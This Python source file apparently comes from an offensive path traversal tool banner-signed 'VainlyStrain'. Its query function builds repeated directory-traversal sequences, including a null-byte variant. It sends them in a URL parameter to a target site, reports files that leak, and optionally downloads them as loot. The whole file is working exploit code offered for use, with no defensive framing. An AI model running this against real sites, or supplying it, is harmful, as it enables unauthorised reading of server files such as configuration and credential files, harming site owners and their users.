#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
_____, ___
   '+ .;    
    , ;   
     .   
           
       .    
     .;.    
     .;  
      :  
      ,   
       

┌─[pathtrav]─[~]
└──╼ VainlyStrain
"""

from core.session import session
from core.colors import color
from core.variables import payloadlist
from modvles.filecheck import filecheck
from core.loot import download

def query(url,url2,keyword,files,dirs,depth,verbose,dl,summary):
    found=[]
    urls = []
    requests = session()
    con2 = requests.get(url).content
    for dir in dirs:
        for file in files:
            d=1
            while d <= depth:
                for i in payloadlist:
                    traverse=''
                    j=1
                    while j <= d:
                        traverse+=i
                        j+=1
                    requestlist = []
                    query=keyword+"="+traverse+dir+file+url2
                    requestlist.append(requests.get(url,params=query))
                    query=keyword+"="+traverse+dir+file+"%00"+url2
                    requestlist.append(requests.get(url,params=query))
                    for r in requestlist:
                        if str(r.status_code).startswith("2") or r.status_code == 302:
                            if filecheck(r.content, con2):
                                print(color.RD+"INFO"+color.END+" Path leaked           "+color.RD+"statvs-code"+color.END+"="+str(r.status_code)+" "+color.R+"site"+color.END+"="+r.url)
                                found.append(dir+file)
                                urls.append(color.RD + "[" + keyword + "]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + r.url.split(keyword+"=")[1].replace(url2, ""))
                                if dl:
                                    download(r.url,file)
                        elif r.status_code == 403:
                            #if not summary:
                            print(color.RD+"INFO"+color.END+" Path leaked           "+color.RD+"statvs-code"+color.END+"="+str(r.status_code)+" "+color.R+"site"+color.END+"="+r.url)
                            found.append(dir+file)
                            urls.append(color.RD + "[" + keyword + "]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + r.url.split(keyword+"=")[1].replace(url2, ""))
                        else:
                            if verbose:
                                print(r.url,r.status_code)
                d+=1
    return (found, urls)
